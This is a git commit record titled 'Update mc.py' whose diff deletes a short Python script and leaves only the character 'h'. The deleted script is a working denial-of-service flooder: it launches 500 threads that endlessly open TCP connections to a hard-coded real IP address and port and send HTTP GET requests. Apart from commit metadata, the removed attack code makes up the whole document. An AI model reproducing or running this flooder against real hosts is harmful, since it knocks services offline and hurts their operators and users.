b692d8ca13305fc753bcd0be5515e194c561b059
Biasstudents <139652035+Biasstudents@users.noreply.github.com>
2023-07-19 23:09:03 +0600

    Update mc.py

--- mc.py
+++ mc.py
@@ -1,17 +1,1 @@
-import socket
-import threading
-
-target = '185.107.194.87'
-port = 60184
-
-def attack():
-    while True:
-        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-        s.connect((target, port))
-        s.sendto(("GET /" + target + " HTTP/1.1\r\n").encode('ascii'), (target, port))
-        s.sendto(("Host: " + target + "\r\n\r\n").encode('ascii'), (target, port))
-        s.close()
-
-for i in range(500):
-    thread = threading.Thread(target=attack)
-    thread.start()
+h
